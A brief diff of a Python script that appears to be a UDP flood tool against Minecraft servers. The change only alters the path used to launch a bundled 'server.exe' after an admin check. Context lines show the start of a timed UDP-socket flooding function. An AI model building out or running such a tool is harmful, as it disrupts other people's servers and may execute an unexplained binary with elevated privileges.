@@ -77,7 +77,7 @@ if ctypes.windll.shell32.IsUserAnAdmin() != True:
 print(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" " starting...")
 
 cwd = os.getcwd()
-os.startfile(f"{cwd}/serv/sv/server.exe")
+os.startfile(f"{cwd}\\serv\\sv\\server.exe")
 def minecraftsexptdr(ip,port,temps):
     timeout = time.time() + float(temps)
     udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
